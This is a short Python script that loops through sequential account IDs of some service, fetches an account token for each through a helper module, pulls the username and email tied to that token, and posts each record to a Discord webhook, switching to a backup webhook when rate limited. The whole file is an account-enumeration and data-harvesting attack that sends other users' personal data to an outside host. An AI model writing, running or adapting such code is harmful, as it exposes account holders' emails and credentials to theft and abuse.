import api
import httpx, random

webhook = "https://discord.com/api/webhooks/..."
webhook2 = "https://discord.com/api/webhooks/.." # backup webhook incase first gets rate limited

id = 297979966
uninit = 1605
tried = 5968
while True:
     tried += 1
     token = api.getToken(str(id))
     username = api.getUsernameFromToken(token)
     email = api.getEmailFromToken(token)
     if username == "new_player":
        uninit += 1
     paylaod = {
	 "content":None,
	 "embeds":[
        {
			"title": f"ID: {id}",
            "description": f"Tried: __{tried}__\nUninitialized: __{uninit}__\nUsername: __{username}__\nEmail: __{email}__",
			"color":random.randint(1, 16777215),
		}
	],
	"attachments":[
	]
    }
     r = httpx.post(url=webhook, json=paylaod)
     if r.status_code == 204:
         print(f"Status: {r.status_code} Response: {r.text}")
     if r.status_code == 429:
        print("Rate limited! Switching to 2nd webhook")
        r = httpx.post(url=webhook2, json=paylaod)
        print(f"Status: {r.status_code} Response: {r.text}")
     id += 1
     